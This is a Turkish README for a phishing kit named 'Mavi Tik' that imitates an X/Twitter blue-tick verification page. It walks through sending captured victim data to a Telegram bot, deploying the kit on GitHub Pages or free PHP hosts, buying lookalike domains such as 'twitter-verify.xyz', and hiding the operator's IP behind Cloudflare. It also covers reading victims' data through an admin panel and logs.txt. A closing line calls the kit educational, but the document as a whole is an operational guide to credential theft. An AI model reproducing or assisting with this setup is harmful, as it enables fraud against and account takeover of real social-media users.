# Mavi Tik Phishing Simülasyonu

## 🚀 Kurulum

### 1. Telegram Bot Oluşturma (ZORUNLU)

1. Telegram'da **@BotFather**'a gir
2. `/newbot` yaz ve bot ismi ver (ör: `mavitik_bot`)
3. Bot oluşunca sana bir **TOKEN** verecek, bunu kaydet
4. **@userinfobot**'a gir, `/start` yaz, sana **Chat ID** versin, onu da kaydet

### 2. Kod İçine Token'ları Gir

Dosyaları aç ve token'ları gir:

**`script.js`** dosyasında:
```js
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // -> BotFather'dan aldığın token
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';       // -> userinfobot'tan aldığın ID
```

**`save.php`** dosyasında (PHP sunucun varsa):
```php
define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE');
define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID_HERE');
```

### 3. Yayınlama Seçenekleri

#### SEÇENEK A: GitHub Pages (ÜCRETSİZ - ÖNERİLEN)

```bash
# 1. GitHub'da yeni repo oluştur (public)
# 2. Bu dosyaları repoya yükle
git init
git add .
git commit -m "initial commit"
git branch -M main
git remote add origin https://github.com/KULLANICIADI/REPO_ADI.git
git push -u origin main

# 3. GitHub'da repo ayarlarına gir
#    Settings > Pages > Source: GitHub Actions
#    Sonra Actions > New workflow > Deploy static content
```

GitHub Pages adresin: `https://KULLANICIADI.github.io/REPO_ADI/`

#### SEÇENEK B: Ücretsiz PHP Hosting

| Hosting | Özellikler |
|---------|------------|
| **infinityfree.net** | Ücretsiz, PHP + MySQL, reklamlı |
| **000webhost.com** | Ücretsiz, PHP, 1GB alan |
| **awardspace.com** | Ücretsiz, PHP, reklamsız |
| **freehostia.com** | Ücretsiz, PHP 8 desteği |

#### SEÇENEK C: VDS/Sunucu (Kendi IP'n)

```bash
# PHP built-in server (geçici)
php -S 0.0.0.0:8080

# Veya Apache/Nginx kurulumu
sudo apt install apache2 php
sudo cp -r * /var/www/html/
```

### 4. Domain Önerileri (Güvenilir Görünen)

Gerçek X/Twitter sayfası gibi görünmesi için şu tarz domainler alabilirsin:

| Domain | Fiyat | Nereden |
|--------|-------|---------|
| `mavi-tik.online` | ~₺20 | Namecheap |
| `twitter-verify.xyz` | ~₺15 | Namecheap |
| `x-verified.life` | ~₺25 | GoDaddy |
| `bluetick.help` | ~₺30 | Namecheap |
| `verification-x.com` | ~₺40 | Namecheap |
| `mavitik.org` | ~₺50 | Namecheap |

**Ücretsiz Domain Seçenekleri:**
- `KULLANICIADI.github.io/REPO_ADI/` (GitHub Pages - ücretsiz)
- `KULLANICIADI.netlify.app` (Netlify - ücretsiz)
- `KULLANICIADI.vercel.app` (Vercel - ücretsiz)

### 5. Cloudflare ile Gizleme (ÖNERİLEN)

1. Cloudflare'a ücretsiz kaydol
2. Domainini ekle
3. DNS ayarlarını Cloudflare'a yönlendir
4. SSL/TLS > Full (strict) seç
5. **Proxy Status: Proxied** yap (IP gizlenir)

Böylece gerçek IP'n gizlenir ve Cloudflare'in güvenilir görünen sayfası açılır.

## 📊 Verileri Görüntüleme

### Telegram'a Anında Bildirim
Token'ları girdiysen, her kurban veri girdiğinde Telegram'ına mesaj gelir.

### Admin Panel (PHP sunucun varsa)
`http://SENIN_ADRESIN/admin.php`
- Kullanıcı: `admin`
- Şifre: `admin123`

### logs.txt (PHP sunucun varsa)
Tüm veriler `logs.txt` dosyasına kaydedilir.

## ⚠️ UYARI
Bu proje **eğitim amaçlıdır**. Gerçek phishing saldırılarında kullanılması yasa dışıdır.
